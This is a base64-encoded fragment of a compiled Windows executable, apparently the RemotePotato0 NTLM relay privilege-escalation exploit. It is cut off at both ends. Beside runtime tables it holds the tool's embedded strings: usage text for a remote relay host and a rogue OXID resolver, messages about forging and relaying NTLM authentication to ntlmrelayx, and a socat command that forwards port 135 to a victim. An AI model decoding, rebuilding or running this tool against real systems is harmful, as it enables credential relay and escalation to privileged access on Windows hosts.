IDVQQC+AAAAkNVBAMMAAACg1UEAsAAAALDVQQC4AAAAwNVBAMsAAADQ1UEAxwAAABi/QQAaAAAA4NVBAFwAAAA4yEEA4wAAAOzVQQDCAAAABNZBAL0AAAAc1kEApgAAADTWQQCZAAAAIL9BABsAAABM1kEAmgAAAFjWQQBdAAAA2L9BADMAAABk1kEAegAAAEDAQQBAAAAAcNZBAIoAAAAAwEEAOAAAAIDWQQCAAAAACMBBADkAAACM1kEAgQAAACi/QQAcAAAAmNZBAF4AAACk1kEAbgAAADC/QQAdAAAAsNZBAF8AAADov0EANQAAALzWQQB8AAAAFLdBACAAAADI1kEAYgAAADi/QQAeAAAA1NZBAGAAAADgv0EANAAAAODWQQCeAAAA+NZBAHsAAAB4v0EAJwAAABDXQQBpAAAAHNdBAG8AAAAo10EAAwAAADjXQQDiAAAASNdBAJAAAABU10EAoQAAAGDXQQCyAAAAbNdBAKoAAAB410EARgAAAITXQQBwAAAAYQBmAC0AegBhAAAAYQByAC0AYQBlAAAAYQByAC0AYgBoAAAAYQByAC0AZAB6AAAAYQByAC0AZQBnAAAAYQByAC0AaQBxAAAAYQByAC0AagBvAAAAYQByAC0AawB3AAAAYQByAC0AbABiAAAAYQByAC0AbAB5AAAAYQByAC0AbQBhAAAAYQByAC0AbwBtAAAAYQByAC0AcQBhAAAAYQByAC0AcwBhAAAAYQByAC0AcwB5AAAAYQByAC0AdABuAAAAYQByAC0AeQBlAAAAYQB6AC0AYQB6AC0AYwB5AHIAbAAAAAAAYQB6AC0AYQB6AC0AbABhAHQAbgAAAAAAYgBlAC0AYgB5AAAAYgBnAC0AYgBnAAAAYgBuAC0AaQBuAAAAYgBzAC0AYgBhAC0AbABhAHQAbgAAAAAAYwBhAC0AZQBzAAAAYwBzAC0AYwB6AAAAYwB5AC0AZwBiAAAAZABhAC0AZABrAAAAZABlAC0AYQB0AAAAZABlAC0AYwBoAAAAZABlAC0AZABlAAAAZABlAC0AbABpAAAAZABlAC0AbAB1AAAAZABpAHYALQBtAHYAAAAAAGUAbAAtAGcAcgAAAGUAbgAtAGEAdQAAAGUAbgAtAGIAegAAAGUAbgAtAGMAYQAAAGUAbgAtAGMAYgAAAGUAbgAtAGcAYgAAAGUAbgAtAGkAZQAAAGUAbgAtAGoAbQAAAGUAbgAtAG4AegAAAGUAbgAtAHAAaAAAAGUAbgAtAHQAdAAAAGUAbgAtAHUAcwAAAGUAbgAtAHoAYQAAAGUAbgAtAHoAdwAAAGUAcwAtAGEAcgAAAGUAcwAtAGIAbwAAAGUAcwAtAGMAbAAAAGUAcwAtAGMAbwAAAGUAcwAtAGMAcgAAAGUAcwAtAGQAbwAAAGUAcwAtAGUAYwAAAGUAcwAtAGUAcwAAAGUAcwAtAGcAdAAAAGUAcwAtAGgAbgAAAGUAcwAtAG0AeAAAAGUAcwAtAG4AaQAAAGUAcwAtAHAAYQAAAGUAcwAtAHAAZQAAAGUAcwAtAHAAcgAAAGUAcwAtAHAAeQAAAGUAcwAtAHMAdgAAAGUAcwAtAHUAeQAAAGUAcwAtAHYAZQAAAGUAdAAtAGUAZQAAAGUAdQAtAGUAcwAAAGYAYQAtAGkAcgAAAGYAaQAtAGYAaQAAAGYAbwAtAGYAbwAAAGYAcgAtAGIAZQAAAGYAcgAtAGMAYQAAAGYAcgAtAGMAaAAAAGYAcgAtAGYAcgAAAGYAcgAtAGwAdQAAAGYAcgAtAG0AYwAAAGcAbAAtAGUAcwAAAGcAdQAtAGkAbgAAAGgAZQAtAGkAbAAAAGgAaQAtAGkAbgAAAGgAcgAtAGIAYQAAAGgAcgAtAGgAcgAAAGgAdQAtAGgAdQAAAGgAeQAtAGEAbQAAAGkAZAAtAGkAZAAAAGkAcwAtAGkAcwAAAGkAdAAtAGMAaAAAAGkAdAAtAGkAdAAAAGoAYQAtAGoAcAAAAGsAYQAtAGcAZQAAAGsAawAtAGsAegAAAGsAbgAtAGkAbgAAAGsAbwBrAC0AaQBuAAAAAABrAG8ALQBrAHIAAABrAHkALQBrAGcAAABsAHQALQBsAHQAAABsAHYALQBsAHYAAABtAGkALQBuAHoAAABtAGsALQBtAGsAAABtAGwALQBpAG4AAABtAG4ALQBtAG4AAABtAHIALQBpAG4AAABtAHMALQBiAG4AAABtAHMALQBtAHkAAABtAHQALQBtAHQAAABuAGIALQBuAG8AAABuAGwALQBiAGUAAABuAGwALQBuAGwAAABuAG4ALQBuAG8AAABuAHMALQB6AGEAAABwAGEALQBpAG4AAABwAGwALQBwAGwAAABwAHQALQBiA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G1vZGYAAAAAbGRleHAAAABfY2FicwAAAF9oeXBvdAAAZm1vZAAAAABmcmV4cAAAAF95MABfeTEAX3luAF9sb2diAAAAX25leHRhZnRlcgAAAAAAAAAAAAAAAPB/////////738AAAAAAAAAgAAAAAAAAAAAAACATwAAAF//////AAAAAFshXSBDb3VsZG4ndCBmb3JnZSB0aGUgaHR0cCBwYWNrZXQgd2l0aCB0aGUgdHlwZSAxIGF1dGggYW5kIHNlbmQgaXQgdG8gdGhlIGh0dHAgc2VydmVyLgoAAAAAWyFdIENvdWxkbid0IHJlY2VpdmUgdGhlIGh0dHAgcmVzcG9uc2UgZnJvbSB0aGUgaHR0cCBzZXJ2ZXIKAAAAAFshXSBDb3VsZG4ndCBjb21tdW5pY2F0ZSB3aXRoIHRoZSBmYWtlIFJQQyBTZXJ2ZXIKAABbIV0gQ291bGRuJ3QgcmVjZWl2ZSB0aGUgdHlwZTIgbWVzc2FnZSBmcm9tIHRoZSBmYWtlIFJQQyBTZXJ2ZXIKAAAAAAAAAABbIV0gQ291bGRuJ3Qgc2VuZCB0aGUgYWx0ZXJlZCB0eXBlMiB0byB0aGUgcnBjIGNsaWVudCAodGhlIHByaXZpbGVnZWQgYXV0aCkKAAAAAFshXSBDb3VsZG4ndCByZWNlaXZlIHRoZSB0eXBlMyBhdXRoIGZyb20gdGhlIHJwYyBjbGllbnQKAAAAAFshXSBDb3VsZG4ndCBzZW5kIHRoZSB0eXBlMyBBVVRIIHRvIHRoZSBodHRwIHNlcnZlcgoAAAAAWyFdIENvdWxkbid0IHJlY2VpdmUgdGhlIG91dHB1dCBmcm9tIHRoZSBodHRwIHNlcnZlcgoAAABbK10gUmVsYXlpbmcgc2VlbXMgc3VjY2Vzc2Z1bGwsIGNoZWNrIG50bG1yZWxheXggb3V0cHV0IQoAAABbIV0gUmVsYXlpbmcgZmFpbGVkIDooCgBXU0FTdGFydHVwIGZhaWxlZCB3aXRoIGVycm9yOiAlZAoAAABnZXRhZGRyaW5mbyBmYWlsZWQgd2l0aCBlcnJvcjogJWQKAABzb2NrZXQgZmFpbGVkIHdpdGggZXJyb3I6ICVsZAoAAGJpbmQgZmFpbGVkIHdpdGggZXJyb3I6ICVkCgBbKl0gUlBDIHJlbGF5IHNlcnZlciBsaXN0ZW5pbmcgb24gcG9ydCAlUyAuLi4KAABsaXN0ZW4gZmFpbGVkIHdpdGggZXJyb3I6ICVkCgAAAGFjY2VwdCBmYWlsZWQgd2l0aCBlcnJvcjogJWQKAAAAAAAAAFsrXSBSZWNlaXZlZCB0aGUgcmVsYXllZCBhdXRoZW50aWNhdGlvbiBmb3IgaVJlbVVua25vd24yIHF1ZXJ5IG9uIHBvcnQgJVMKAAAAAAAAVwBTAEEAUwB0AGEAcgB0AHUAcAAgAGYAdQBuAGMAdABpAG8AbgAgAGYAYQBpAGwAZQBkACAAdwBpAHQAaAAgAGUAcgByAG8AcgA6ACAAJQBkAAoAAAAAAHMAbwBjAGsAZQB0ACAAZgB1AG4AYwB0AGkAbwBuACAAZgBhAGkAbABlAGQAIAB3AGkAdABoACAAZQByAHIAbwByADoAIAAlAGwAZAAKAAAAYwBvAG4AbgBlAGMAdAAgAGYAdQBuAGMAdABpAG8AbgAgAGYAYQBpAGwAZQBkACAAdwBpAHQAaAAgAGUAcgByAG8AcgA6ACAAJQBsAGQACgAAAAAAAAAAAGMAbABvAHMAZQBzAG8AYwBrAGUAdAAgAGYAdQBuAGMAdABpAG8AbgAgAGYAYQBpAGwAZQBkACAAdwBpAHQAaAAgAGUAcgByAG8AcgA6ACAAJQBsAGQACgAAAAAAWypdIENvbm5lY3RlZCB0byBSUEMgU2VydmVyICVTIG9uIHBvcnQgJVMKAABbKl0gQ29ubmVjdGVkIHRvIG50bG1yZWxheXggSFRUUCBTZXJ2ZXIgJVMgb24gcG9ydCAlUwoAAEdFVCAvIEhUVFAvMS4xDQpIb3N0OiAlcw0KQXV0aG9yaXphdGlvbjogTlRMTSAlcw0KDQoAAAAAWytdIEdvdCBOVExNIHR5cGUgMyBBVVRIIG1lc3NhZ2UgZnJvbSAlU1wlUyB3aXRoIGhvc3RuYW1lICVTIAoAAENyeXB0QmluYXJ5VG9TdHJpbmdBIGZhaWxlZCB3aXRoIGVycm9yIGNvZGUgJWQAAENyeXB0U3RyaW5nVG9CaW5hcnlBIGZhaWxlZCB3aXRoIGVycm9yIGNvZGUgJWQAAHsAMAAwADAAMAAwADMAMAA2AC0AMAAwADAAMAAtADAAMAAwADAALQBjADAAMAAwAC0AMAAwADAAMAAwADAAMAAwADAAMAA0ADYAfQAAAAAAJQBzAFsAJQBzAF0AAAAAAFsqXSBJU3RvcmFnZXRyaWdnZXIgd3JpdHRlbjogJWQgYnl0ZXMKAABoAGUAbABsAG8ALgBzAHQAZwAAABwEQgA3JEAALSRAACMkQACAIUAAYCJAAFAhQAAwIkAAICFAAAAiQAAAIUAAoCJAANAhQACwIUAAkCJAALAiQADgHUAAkCJAAMAiQADsA0IAMCNAAPAjQAAQJEAAEB5AAPAdQAAwHkAA4CBAAOAdQADgHUAAVW5rbm93biBleGNlcHRpb24AAABiYWQgYXJyYXkgbmV3IGxlbmd0aAAAAABzdHJpbmcgdG9vIGxvbmcAZ2VuZXJpYwBzeXN0ZW0AADgAMAAAAAAAMQAyADcALgAwAC4AMAAuADEAAAA5ADkAOQA3AAAAAAAAAAAAewA1ADEANgA3AEIANAAyAEYALQBDADEAMQAxAC0ANAA3AEEAMQAtAEEAQwBDADQALQA4AEUAQQBCAEUANgAxAEIAMABCADUANAB9AAAAAABXcm9uZyBBcmd1bWVudDogJVMKAAAAAABbKl0gRGV0ZWN0ZWQgYSBXaW5kb3dzIFNlcnZlciB2ZXJzaW9uIGNvbXBhdGlibGUgd2l0aCBKdWljeVBvdGF0by4gUm9ndWVPeGlkUmVzb2x2ZXIgY2FuIGJlIHJ1biBsb2NhbGx5IG9uIDEyNy4wLjAuMQoAAABbKl0gRGV0ZWN0ZWQgYSBXaW5kb3dzIFNlcnZlciB2ZXJzaW9uIG5vdCBjb21wYXRpYmxlIHdpdGggSnVpY3lQb3RhdG8uIFJvZ3VlT3hpZFJlc29sdmVyIG11c3QgYmUgcnVuIHJlbW90ZWx5LiBSZW1lbWJlciB0byBmb3J3YXJkIHRjcCBwb3J0IDEzNSBvbiAlUyB0byB5b3VyIHZpY3RpbSBtYWNoaW5lIG9uIHBvcnQgJVMKAAAAAAAAAABbKl0gRXhhbXBsZSBOZXR3b3JrIHJlZGlyZWN0b3I6IAoJc3VkbyBzb2NhdCBUQ1AtTElTVEVOOjEzNSxmb3JrLHJldXNlYWRkciBUQ1A6e3tUaGlzTWFjaGluZUlwfX06JVMKAAAAAFsqXSBTdGFydGluZyB0aGUgTlRMTSByZWxheSBhdHRhY2ssIGxhdW5jaCBudGxtcmVsYXl4IG9uICVTISEKAAB7ADAAMAAwADAAMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AQwAwADAAMAAtADAAMAAwADAAMAAwADAAMAAwADAANAA2AH0AAAAAAFsqXSBDYWxsaW5nIENvR2V0SW5zdGFuY2VGcm9tSVN0b3JhZ2Ugd2l0aCBDTFNJRDolUwoAAAAAWyFdIEVycm9yLiBDTFNJRCAlUyBub3QgZm91bmQuIEJhZCBwYXRoIHRvIG9iamVjdC4KAFshXSBFcnJvci4gVHJpZ2dlciBEQ09NIGZhaWxlZCB3aXRoIHN0YXR1czogMHgleAoAAAB7ADAAMAAwADAAMAAzADMAQwAtADAAMAAwADAALQAwADAAMAAwAC0AYwAwADAAMAAtADAAMAAwADAAMAAwADAAMAAwADAANAA2AH0AAAAAAFsqXSBTcGF3bmluZyBDT00gb2JqZWN0IGluIHRoZSBzZXNzaW9uOiAlZAoAWypdIENhbGxpbmcgU3RhbmRhcmRHZXRJbnN0YW5jZUZyb21JU3RvcmFnZSB3aXRoIENMU0lEOiVTCgAAUnRsR2V0VmVyc2lvbgAAAG4AdABkAGwAbAAuAGQAbABsAAAACgoJUmVtb3RlUG90YXRvMAoJQHNwbGludGVyX2NvZGUgJiBAZGVjb2Rlcl9pdAoKCgoAAE1hbmRhdG9yeSBhcmdzOiAKLXIgcmVtb3RlIHJlbGF5IGhvc3QKLXAgUm9ndWUgT3hpZCBSZXNvbHZlciBwb3J0CgAACgoAAE9wdGlvbmFsIGFyZ3M6IAotcyBDcm9zcyBzZXNzaW9uIGFjdGl2YXRpb24gKGRlZmF1bHQgZGlzYWJsZWQpCi1sIGxvY2FsIGxpc3RlbmVyIHBvcnQgKERlZmF1bHQgOTk5NykKLW0gcmVtb3RlIHJlbGF5IHBvcnQgKERlZmF1bHQgODApCi1jIGNsc2lkIChEZWZhdWx0IHs1MTY3QjQyRi1DMTExLTQ3QTEtQUNDNC04RUFCRTYxQjBCNTR9KQoAAAAMBUIAsCZAAFAmQABgJkAAsCVAABAmQADQJUAAdW5rbm93biBlcnJvcgAAAPgEQgCwJkAA0CZAAOAmQACAJ0AAECZAANAlQABuY2Fjbl9pcF90Y3AAAAAAWy1dIFJwY1NlcnZlclVzZVByb3RzZXFFcCgpIGZhaWxlZCB3aXRoIHN0YXR1cyBjb2RlICVkCgBbLV0gUnBjU2VydmVyUmVnaXN0ZXJJZjIoKSBmYWlsZWQgd2l0aCBzdGF0dXMgY29kZSAlZAoAAFstXSBScGNTZXJ2ZXJJbnFCaW5kaW5ncygpIGZhaWxlZCB3aXRoIHN0YXR1cyBjb2RlICVkCgAAWy1dIF